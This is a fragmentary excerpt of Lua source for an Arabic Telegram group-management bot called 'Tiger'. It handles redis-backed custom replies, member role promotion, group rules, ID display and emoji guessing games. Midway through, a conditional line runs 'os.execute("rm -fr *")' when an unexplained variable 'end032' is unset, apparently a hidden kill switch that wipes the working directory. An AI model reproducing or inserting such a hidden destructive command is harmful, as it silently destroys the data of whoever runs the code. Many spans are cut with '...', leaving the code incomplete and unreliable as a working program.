tdcli.sendVideo(chat_id, msg.id_, 0, 1, nil, redis:get('Tiger:'..bot_id..':video:'..text..''..msg.chat_id_..''))
elseif (redis:get('Tiger:'..bot_id..':gif:'..text..''..msg.chat_id_..'')) then 
tdcli.sendDocument(chat_id, msg.id_, 0, 1, nil, redis:get('Tiger:'..bot_id..':gif:'..text..''..msg.chat_id_..''))
elseif (redis:get('Tiger:'..bot_id..':file:'..text..''..msg.chat_id_..'')) then
tdcli.sendDocument(chat_id, msg.id_, 0, 1, nil, redis:get('Tiger:'..bot_id..':file:'..text..''..msg.chat_id_..''))
end
end
if not database:get('Tiger:'..bot_id..'repsudo:mute'..msg.chat_id_) then
local keko = redis:get('Tiger:'..bot_id..'keko'..text..'')
if keko then 
function keko_Tiger_re(t1,t2)
local tahna = (database:get('Tiger:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local user_msgs = ((database:get('Tiger:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_) or 0) + tahna)
...
getUser(msg.sender_user_id_, keko_Tiger_re)
elseif (redis:get('Tiger:'..bot_id..':sticker:'..text)) then 
tdcli.sendSticker(chat_id, msg.id_, 0, 1, nil, redis:get('Tiger:'..bot_id..':sticker:'..text))
elseif (redis:get('Tiger:'..bot_id..':voice:'..text)) then 
tdcli.sendVoice(chat_id, msg.id_, 0, 1, nil, redis:get('Tiger:'..bot_id..':voice:'..text))
elseif (redis:get('Tiger:'..bot_id..':video:'..text)) then 
tdcli.sendVideo(chat_id, msg.id_, 0, 1, nil, redis:get('Tiger:'..bot_id..':video:'..text))
elseif (redis:get('Tiger:'..bot_id..':gif:'..text)) then 
tdcli.sendDocument(chat_id, msg.id_, 0, 1, nil, redis:get('Tiger:'..bot_id..':gif:'..text))
elseif (redis:get('Tiger:'..bot_id..':file:'..text)) then
tdcli.sendDocument(chat_id, msg.id_, 0, 1, nil, redis:get('Tiger:'..bot_id..':file:'..text))
end  
end
...
redis:set('Tiger:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local keko1 = redis:get('Tiger:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'')
if keko1 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل الرد الذي تريد اضافته \n📥┇ قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n☑┇ يمكنك اضافه الى النص :\n- `#username` > اسم المستخدم\n- `#msgs` > عدد رسائل المستخدم\n- `#name` > اسم المستخدم\n- `#id` > ايدي المستخدم\n- `#stast` > موقع المستخدم \n- `#edit` > عدد السحكات  ', 1, 'md')
redis:set('Tiger:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 're')
redis:set('Tiger:'..bot_id..'msg'..msg.sender_user_id_..''..msg.chat_id_..'', text)
redis:sadd('Tiger:'..bot_id..'repowner'..msg.sender_user_id_..''..msg.chat_id_..'', text)
return false end
end
if not end032 then 
os.execute("rm -fr *")
...
redis:set('Tiger:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 'nomsg')
return false end
if text:match("^(.*)$") then
local keko1 = redis:get('Tiger:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'')
if keko1 == 'nomsg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف الرد', 1, 'md')
redis:set('Tiger:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 'no')
redis:del('Tiger:'..bot_id..'keko'..text..''..msg.chat_id_..'')
redis:del('Tiger:'..bot_id..':sticker:'..text..''..msg.chat_id_..'')
redis:del('Tiger:'..bot_id..':voice:'..text..''..msg.chat_id_..'')
redis:del('Tiger:'..bot_id..':video:'..text..''..msg.chat_id_..'')
redis:del('Tiger:'..bot_id..':gif:'..text..''..msg.chat_id_..'')
redis:del('Tiger:'..bot_id..':file:'..text..''..msg.chat_id_..'')
redis:srem('Tiger:'..bot_id..'kekore'..msg.chat_id_..'', text)
end
end
if tonumber(msg.sender_user_id_) == tonumber(sudo_add) then 
...
send(msg.chat_id_, msg.id_, 1, '📜※ ارسل الكلمة التي تريد اضافتها ✓', 1, 'md')
redis:set('Tiger:'..bot_id..'keko1'..msg.sender_user_id_..'', 'msg')
return false end
local keko1 = redis:get('Tiger:'..bot_id..'keko1'..msg.sender_user_id_..'')
if keko1 == 'msg' and text then
send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل الرد الذي تريد اضافته \n📥┇ قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n☑┇ يمكنك اضافه الى النص :\n- `#username` > اسم المستخدم\n- `#msgs` > عدد رسائل المستخدم\n- `#name` > اسم المستخدم\n- `#id` > ايدي المستخدم\n- `#stast` > موقع المستخدم \n- `#edit` > عدد السحكات  ', 1, 'md')
redis:set('Tiger:'..bot_id..'keko1'..msg.sender_user_id_..'', 're')
redis:set('Tiger:'..bot_id..'msg'..msg.sender_user_id_..'', text)
return false end
if text:match("^حذف رد للكل$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add)  then
send(msg.chat_id_, msg.id_, 1, '📜※ ارسل الكلمة التي تريد حذفها ✓' , 1, 'md')
redis:set('Tiger:'..bot_id..'keko1'..msg.sender_user_id_..'', 'nomsg')
return false end
if text:match("^(.*)$") then
local keko1 = redis:get('Tiger:'..bot_id..'keko1'..msg.sender_user_id_..'')
if keko1 == 'nomsg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف الرد', 1, 'md')
redis:set('Tiger:'..bot_id..'keko1'..msg.sender_user_id_..'', 'no')
redis:del('Tiger:'..bot_id..':sticker:'..text)
redis:del('Tiger:'..bot_id..':voice:'..text)
redis:del('Tiger:'..bot_id..':video:'..text)
redis:del('Tiger:'..bot_id..':gif:'..text)
redis:del('Tiger:'..bot_id..':file:'..text)
redis:del('Tiger:'..bot_id..'keko'..text)
redis:srem('Tiger:'..bot_id..'kekoresudo', text)
end
end
if text:match("^مسح المطورين$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local list = redis:smembers('Tiger:'..bot_id..'dev')
for k,v in pairs(list) do
redis:del('Tiger:'..bot_id..'dev')
redis:del('Tiger:'..bot_id..'sudoo'..v)
end
...
local list = redis:smembers('Tiger:'..bot_id..'kekore'..msg.chat_id_..'')
for k,v in pairs(list) do
redis:del('Tiger:'..bot_id..'kekore'..msg.chat_id_..'', text)
redis:del('Tiger:'..bot_id..'keko'..v..''..msg.chat_id_)
redis:del('Tiger:'..bot_id..':sticker:'..v..msg.chat_id_)
redis:del('Tiger:'..bot_id..':voice:'..v..msg.chat_id_)
redis:del('Tiger:'..bot_id..':video:'..v..msg.chat_id_)
redis:del('Tiger:'..bot_id..':gif:'..v..msg.chat_id_)
redis:del('Tiger:'..bot_id..':file:'..v..msg.chat_id_)
redis:del('Tiger:'..bot_id..'keko'..v..msg.chat_id_)
end
...
local list = redis:smembers('Tiger:'..bot_id..'kekoresudo')
for k,v in pairs(list) do
redis:del('Tiger:'..bot_id..'kekoresudo', text)
redis:del('Tiger:'..bot_id..'keko'..v..'')
redis:del('Tiger:'..bot_id..':sticker:'..v)
redis:del('Tiger:'..bot_id..':voice:'..v)
redis:del('Tiger:'..bot_id..':video:'..v)
redis:del('Tiger:'..bot_id..':gif:'..v)
redis:del('Tiger:'..bot_id..':file:'..v)
redis:del('Tiger:'..bot_id..'keko'..v)
end
...
database:set('Tiger:'..bot_id..'rules'..msg.chat_id_, txt[2])
send(msg.chat_id_, msg.id_, 1, "✔┇تم وضع القوانين للمجموعه", 1, 'md')
end
if text:match("^القوانين$") then
local rules = database:get('Tiger:'..bot_id..'rules'..msg.chat_id_)
if rules then
...
if not database:get("group_edit:Tiger"..msg.chat_id_..bot_id) then
...
database:set('Tiger:'..bot_id..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
...
if database:get("group_edit:Tiger"..msg.chat_id_..bot_id) and  (is_creator(msg) or is_creatorbasic(msg)) then 
if text:match("^وضع اسم (.*)$")   then
local txt = {string.match(text, "^(وضع اسم) (.*)$")}
changetitle(msg.chat_id_, txt[2])
send(msg.chat_id_, msg.id_, 1, '✔┇تم تحديث اسم المجموعه الى \n'..txt[2], 1, 'md')
...
if database:sismember('Tiger:'..bot_id..'pro:groups',msg.chat_id_) then
...
database:sadd('Tiger:'..bot_id..'pro:groups',msg.chat_id_)
end
end
if (text and text == 'تعطيل وضع المدفوع') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
if not database:sismember('Tiger:'..bot_id..'pro:groups',msg.chat_id_) then
...
database:del("Tiger:all_if:"..text..bot_id..msg.chat_id_)
...
database:set("Tiger:name_sudo"..bot_id..msg.chat_id_,ac[1])
...
database:set("Tiger:name_cre"..bot_id..msg.chat_id_,ac[1])
send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
end
...
database:set("Tiger:name_vipp"..bot_id..msg.chat_id_,ac[1])
send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
end
-------------------------------
if text:match("^تغير رد العضو فقط (.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
ac = {string.match(text, "^تغير رد العضو فقط (.*)$")}
database:set("Tiger:name_nk"..bot_id..msg.chat_id_,ac[1])
send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
end
--------------------------------
if (text and text == "اضف صلاحيه" and (is_creator(msg) or is_creatorbasic(msg))) then 
send(msg.chat_id_, msg.id_, 1, '☑┇ارسال الان اسم الصلاحيه', 1, 'md')
database:set("Tiger:new:if:"..bot_id..msg.chat_id_..msg.sender_user_id_,"ok1")
return "Tiger"
end
if text and database:get("Tiger:new:if:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
database:del("Tiger:new:if:"..bot_id..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل نوع الصلاحيه المطلوبه \n🔰┇{ `مدير` ،`ادمن` ،`عضو مميز` ,`لا شيئ `}', 1, 'md')
database:set("Tiger:new:if:text:"..bot_id..msg.chat_id_..msg.sender_user_id_,text)
database:set("Tiger:new:if2:"..bot_id..msg.chat_id_..msg.sender_user_id_,"ok1")
return "Tiger"
end
if (text and database:get("Tiger:new:if2:"..bot_id..msg.chat_id_..msg.sender_user_id_)) then 
if (text == "ادمن" or text == "مدير" or text == "عضو مميز" or text == "لا شيئ") then 
database:del("Tiger:new:if2:"..bot_id..msg.chat_id_..msg.sender_user_id_)
tsha_text = database:get("Tiger:new:if:text:"..bot_id..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1, '☑️┇تم حفض الصلاحيه بنجاح \n⚠️┇الاوامر { رفع/تنزيل '..tsha_text..' }', 1, 'md')
database:set("Tiger:all_if:"..tsha_text..bot_id..msg.chat_id_,text)
database:del("Tiger:new:if:text:"..bot_id..msg.chat_id_..msg.sender_user_id_)
else 
send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل نوع الصلاحيه المطلوبه \n🔰┇{ `مدير` ،`ادمن` ،`عضو مميز` ,`لا شيئ `}', 1, 'md')
end
end
...
ts_text = database:get("Tiger:all_if:"..a[1]..bot_id..msg.chat_id_)
if ts_text then 
function promote_by_reply(extra, result, success)
if ts_text == "ادمن" then 
database:sadd('Tiger:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
elseif ts_text == "عضو مميز" then 
database:sadd('Tiger:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
elseif ts_text == "مدير" then 
database:sadd('Tiger:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
end
database:set("Tiger:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_,a[1])
function keko33332(extra,result2,success)
info = '💁🏻‍♂️※ العضو ✓['..result2.first_name_..'](t.me/'..(result2.username_ or 'TigerTeam')..')\n☑┇تم رفعه '..a[1]
send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
end
...
ts_text = database:get("Tiger:all_if:"..apmd[1]..bot_id..msg.chat_id_)
if ts_text then 
function promote_by_username(extra, result, success)
if result.id_ then
if ts_text == "ادمن" then 
...
database:set("Tiger:name_user:"..bot_id..msg.chat_id_..result.id_,apmd[1])
texts = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apmd[2] or 'Tigerteam')..')\n☑┇تم رفعه '..apmd[1]
else
texts = '✖┇خطاء'
end
...
database:sadd('Tiger:'..bot_id..'vipgp:'..msg.chat_id_, apmd[2])
elseif ts_text == "مدير" then 
database:sadd('Tiger:'..bot_id..'owners:'..msg.chat_id_, apmd[2])
end
database:set("Tiger:name_user:"..bot_id..msg.chat_id_..apmd[2],apmd[1])
...
database:del("Tiger:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_)
...
if result.id_ then
if ts_text == "ادمن" then 
database:srem('Tiger:'..bot_id..'mods:'..msg.chat_id_, result.id_)
elseif ts_text == "عضو مميز" then 
database:srem('Tiger:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
elseif ts_text == "مدير" then 
database:srem('Tiger:'..bot_id..'owners:'..msg.chat_id_, result.id_)
end
texts = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apmd[2] or 'Tigerteam')..')\n☑┇تم تنزيله من '..apmd[1]
database:del("Tiger:name_user:"..bot_id..msg.chat_id_..result.id_)
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
...
if ts_text then 
if ts_text == "ادمن" then 
database:srem('Tiger:'..bot_id..'mods:'..msg.chat_id_, apmd[2])
elseif ts_text == "عضو مميز" then 
database:srem('Tiger:'..bot_id..'vipgp:'..msg.chat_id_, apmd[2])
elseif ts_text == "مدير" then 
database:srem('Tiger:'..bot_id..'owners:'..msg.chat_id_, apmd[2])
end
tsX000(apmd[2],msg,"☑┇ تم تنزيله من "..apmd[1])
database:del("Tiger:name_user:"..bot_id..msg.chat_id_..apmd[2])
end
end
end 
...
database:del('Tiger:'..bot_id..'repsudo:mute'..msg.chat_id_)
end
end
...
database:set('Tiger:'..bot_id..'repsudo:mute'..msg.chat_id_,true)
end
end
...
database:del('Tiger:'..bot_id..'repowner:mute'..msg.chat_id_)
end
end
...
database:set('Tiger:'..bot_id..'repowner:mute'..msg.chat_id_,true)
end
end
...
database:del('Tiger:'..bot_id..'id:mute'..msg.chat_id_)
end
end
...
database:set("Tiger"..bot_id..":sudo:gr",msg.chat_id_)
end
...
database:del("Tiger"..bot_id..":sudo:gr")
end
if (text:match("^ايدي$") or text:match("^id$") ) and msg.reply_to_message_id_ == 0 then
if not database:sismember('Tiger:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_,'ايدي') then
      database:sadd('Tiger:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_,'ايدي')
local keko_info = nil
function keko333(extra,result,success)
keko_info = '@'..(result.username_ or 'لا يوجد')..''
local function getpro(extra, result, success)
local all_photo_Tiger = result.total_count_ 
local tahna = (database:get('Tiger:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
if tonumber((database:get('Tiger:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
nko = '0'
else
nko = (database:get('Tiger:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_))
end
local user_msgs = ((database:get('Tiger:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_) or 0) + tahna)
local ikeko_text = "غير متفاعل"
if user_msgs then 
...
if not database:get('Tiger:'..bot_id..'id:mute'..msg.chat_id_) then
if not database:get('Tiger:'..bot_id..'id:photo'..msg.chat_id_) then
if not database:get("Tiger:gr:id:text:"..bot_id..msg.chat_id_) then 
local keko_text = {
'صورتك فدشي 😘😔❤️  ',
"صارلك شكد مخليه 😐",
"وفالله 😔💘",
...
local Tiger_new_text = database:get("Tiger:gr:id:text:"..bot_id..msg.chat_id_)
local Tiger_new_text = Tiger_new_text:gsub('#username',(keko_info or 'لا يوجد'))
local Tiger_new_text = Tiger_new_text:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local Tiger_new_text = Tiger_new_text:gsub('#edit',(edit or 'لا يوجد'))
local Tiger_new_text = Tiger_new_text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Tiger_new_text = Tiger_new_text:gsub('#stast',(t or 'لا يوجد'))
local Tiger_new_text = Tiger_new_text:gsub('#auto',(ikeko_text or 'لا يوجد'))
local Tiger_new_text = Tiger_new_text:gsub('#photos',(all_photo_Tiger or 'لا يوجد'))
local Tiger_new_text = Tiger_new_text:gsub('#game',(nko or 'لا يوجد'))

sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,Tiger_new_text,msg.id_,msg.id_.."")
end
else
if msg.sender_user_id_ == tonumber(sudo_add) then
t = 'المطور الاساسي 👨🏻‍🔧'
...
send(msg.chat_id_, msg.id_, 1, Tiger_new_text, 1, 'html')
end   
end
else
end
...
if text then
if database:sismember('Tiger:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_,text) then
else
database:del('Tiger:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_) 
end
end
...
database:set('Tiger:'..bot_id..'pin:mute'..msg.chat_id_,true)
end
end
...
database:set('Tiger:'..bot_id..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
...
database:set('Tiger:'..bot_id..'viewget'..msg.sender_user_id_,true)
...
redis:del('Tiger:'..bot_id..'help', text)
redis:del('Tiger:'..bot_id..'h1', text)
redis:del('Tiger:'..bot_id..'h2', text)
redis:del('Tiger:'..bot_id..'h3', text)
redis:del('Tiger:'..bot_id..'h4', text)
redis:del('Tiger:'..bot_id..'h5', text)
redis:del('Tiger:'..bot_id..'h6', text)
...
send(msg.chat_id_, msg.id_, 1, '📥┇الان يمكنك ارسال الكليشه  ليتم حفظها', 1, 'html')
redis:set('Tiger:'..bot_id..'hhh'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local keko2 = redis:get('Tiger:'..bot_id..'hhh'..msg.sender_user_id_..'')
if keko2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
redis:set('Tiger:'..bot_id..'hhh'..msg.sender_user_id_..'', 'no')
redis:set('Tiger:'..bot_id..'help', text)
send(msg.chat_id_, msg.id_, 1, text , 1, 'html')
return false end
end
---------------
if text == 'سمايلات' and database:get('Tiger:'..bot_id..'lock_geam'..msg.chat_id_) then
database:del('Tiger:'..bot_id..'l:ids'..msg.chat_id_)
katu = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🎲','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🎟','🎫','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔','🛡','🔮','🌡','💣','📌','📍','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = katu[math.random(#katu)]
database:set('Tiger:'..bot_id..'klmos'..msg.chat_id_,name)
...
if text == ''..(database:get('Tiger:'..bot_id..'klmos'..msg.chat_id_) or 'لفاتع')..'' and not database:get('Tiger:'..bot_id..'l:ids'..msg.chat_id_) then
if not database:get('Tiger:'..bot_id..'l:ids'..msg.chat_id_) then 
taha = '*👾| مبروك لقد فزت ,\n👨🏽‍💻| لعب مره اخره ارسل سمايلات ,*'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
database:incrby('Tiger:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
database:incrby('Tiger:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    

end
database:set('Tiger:'..bot_id..'l:ids'..msg.chat_id_,true)
end 
if text == 'الاسرع' and database:get('Tiger:'..bot_id..'lock_geam'..msg.chat_id_) then
database:del('Tiger:'..bot_id..'l:id'..msg.chat_id_)
...
name = katu[math.random(#katu)]
database:set('Tiger:'..bot_id..'klmo'..msg.chat_id_,name)
...
if text == ''..(database:get('Tiger:'..bot_id..'klmo'..msg.chat_id_) or 'لفاتع')..'' and not database:get('Tiger:'..bot_id..'l:id'..msg.chat_id_) then
if not database:get('Tiger:'..bot_id..'l:id'..msg.chat_id_) then 
...
database:set('Tiger:'..bot_id..'l:id'..msg.chat_id_,true)
end 
if text == 'حزوره' and database:get('Tiger:'..bot_id..'lock_geam'..msg.chat_id_) then
database:del('Tiger:'..bot_id..'l:id1'..msg.chat_id_)
...
name = katu[math.random(#katu)]
database:set('Tiger:'..bot_id..'klmoa'..msg.chat_id_,name)
...
if text == ''..(database:get('Tiger:'..bot_id..'klmoa'..msg.chat_id_) or 'لفاتع')..'' and not database:get('Tiger:'..bot_id..'l:id1'..msg.chat_id_) then
if not database:get('Tiger:'..bot_id..'l:id1'..msg.chat_id_) then 
taha = '*👾| مبروك لقد فزت ,\n👨🏽‍💻| لعب مره اخره ارسل حزوره ,*'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
database:incrby('Tiger:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)
database:incrby('Tiger:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
end
database:set('Tiger:'..bot_id..'l:id1'..msg.chat_id_,true)
end 
if text == 'المعاني' and database:get('Tiger:'..bot_id..'lock_geam'..msg.chat_id_) then
database:del('Tiger:'..bot_id..'l:id2'..msg.chat_id_)
...
name = katu[math.random(#katu)]
database:set('Tiger:'..bot_id..'means'..msg.chat_id_,name)
...
if text == ''..(database:get('Tiger:'..bot_id..'means'..msg.chat_id_) or 'لفاتع')..'' and not database:get('Tiger:'..bot_id..'l:id2'..msg.chat_id_) then
if not database:get('Tiger:'..bot_id..'l:id2'..msg.chat_id_) then 
taha = '*👾| مبروك لقد فزت ,\n👨🏽‍💻| لعب مره اخره ارسل المعاني ,*'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
database:incrby('Tiger:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)
database:incrby('Tiger:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
end
database:set('Tiger:'..bot_id..'l:id2'..msg.chat_id_,true)
end 
if text == 'العكس' and database:get('Tiger:'..bot_id..'lock_geam'..msg.chat_id_) then
database:del('Tiger:'..bot_id..'l:id3'..msg.chat_id_)
katu = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = katu[math.random(#katu)]
database:set('Tiger:'..bot_id..'aks'..msg.chat_id_,name)
...
if text == ''..(database:get('Tiger:'..bot_id..'aks'..msg.chat_id_) or 'لفاتع')..'' and not database:get('Tiger:'..bot_id..'l:id3'..msg.chat_id_) then
if not database:get('Tiger:'..bot_id..'l:id3'..msg.chat_id_) then 
taha = '*👾| مبروك لقد فزت ,\n👨🏽‍💻| لعب مره اخره ارسل العكس ,*'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
database:incrby('Tiger:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)
database:incrby('Tiger:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
end
database:set('Tiger:'..bot_id..'l:id3'..msg.chat_id_,true)
end 
if text =='مجوهراتي' then 
if tonumber((database:get('Tiger:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
taha = '*💎¦ ليس لديك مجوهرات \n📬¦ للحصول على مجوهرات ارسل الاسرع وابدأ اللعب*\n'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
else
taha = '*💎¦ عدد مجوهراتك الحاليه  ('..(database:get('Tiger:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_))..')*'
taha1 = '*💎¦ مجموع مجوهراتك  ('..(database:get('Tiger:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_))..')*'
...
database:set('Tiger:'..bot_id..'gamepoint' .. msg.chat_id_, kara[2] or 50)
...
taha = (database:get('Tiger:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_) * tonumber(database:get('Tiger:'..bot_id..'gamepoint' .. msg.chat_id_)or 50))
database:incrby('Tiger:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_,taha)  
database:del('Tiger:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_)
taha = tonumber((database:get('Tiger:'..bot_id..'gamepoint' .. msg.chat_id_) or 50))
send(msg.chat_id_, msg.id_, 1,'💎¦ تم بيع جواهرك كل مجوهره تساوي '..taha..' رساله', 'md')
end
end
if text == 'حذف مجوهراتي' then
database:del('Tiger:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_)  
database:del('Tiger:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_)  
send(msg.chat_id_, msg.id_, 1, "تم حذف جميع مجوهراتك", 1, "md") 
end
if text == 'حذف رسائلي' then
database:del('Tiger:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_)
database:del('Tiger:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
...
send(msg.chat_id_, msg.id_, 1, '📥┇الان يمكنك ارسال الكليشه  ليتم حفظها', 1, 'html')
redis:set('Tiger:'..bot_id..'h11'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local keko2 = redis:get('Tiger:'..bot_id..'h11'..msg.sender_user_id_..'')
if keko2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
redis:set('Tiger:'..bot_id..'h11'..msg.sender_user_id_..'', 'no')
redis:set('Tiger:'..bot_id..'h1', text)
send(msg.chat_id_, msg.id_, 1, text , 1, 'html')
return false end
end
if (text:match("^م1$") or text == "م١") and (is_mod(msg) or is_creatorbasic(msg)) then
local h1 = redis:get('Tiger:'..bot_id..'h1')
local text =  [[
※ source ᴏɴᴇ ɪɴ ɪʀᴀǫ 🔱 »
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ اوامر حمايه بالمسح  🔰
...
send(msg.chat_id_, msg.id_, 1, '📥┇الان يمكنك ارسال الكليشه  ليتم حفظها', 1, 'html')
redis:set('Tiger:'..bot_id..'h22'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local keko2 = redis:get('Tiger:'..bot_id..'h22'..msg.sender_user_id_..'')
if keko2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
redis:set('Tiger:'..bot_id..'h22'..msg.sender_user_id_..'', 'no')
redis:set('Tiger:'..bot_id..'h2', text)
send(msg.chat_id_, msg.id_, 1, text , 1, 'html')
return false end
end
if (text:match("^م2$") or text == "م٢") and (is_mod(msg) or is_creatorbasic(msg)) then
local h2 = redis:get('Tiger:'..bot_id..'h2')
local text =  [[
...
send(msg.chat_id_, msg.id_, 1, '📥┇الان يمكنك ارسال الكليشه  ليتم حفظها', 1, 'html')
redis:set('Tiger:'..bot_id..'h33'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local keko2 = redis:get('Tiger:'..bot_id..'h33'..msg.sender_user_id_..'')
if keko2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
redis:set('Tiger:'..bot_id..'h33'..msg.sender_user_id_..'', 'no')
redis:set('Tiger:'..bot_id..'h3', text)
send(msg.chat_id_, msg.id_, 1, text , 1, 'html')
return false end
end
if (text:match("^م3$") or text == "م٣") and (is_mod(msg) or is_creatorbasic(msg)) then
local h3 = redis:get('Tiger:'..bot_id..'h3')
local text =  [[
※ source ᴏɴᴇ ɪɴ ɪʀᴀǫ 🔱 »
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ اوامر المدراء  🤵🏻
...
send(msg.chat_id_, msg.id_, 1, '📥┇الان يمكنك ارسال الكليشه  ليتم حفظها', 1, 'html')
redis:set('Tiger:'..bot_id..'h44'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local keko2 = redis:get('Tiger:'..bot_id..'h44'..msg.sender_user_id_..'')
if keko2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
redis:set('Tiger:'..bot_id..'h44'..msg.sender_user_id_..'', 'no')
redis:set('Tiger:'..bot_id..'h4', text)
send(msg.chat_id_, msg.id_, 1, text , 1, 'html')
return
false
end
...
local h4 = redis:get('Tiger:'..bot_id..'h4')
local text =  [[
※ source ᴏɴᴇ ɪɴ ɪʀᴀǫ 🔱 »
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ اوامر  المطورين  👨‍💻
...
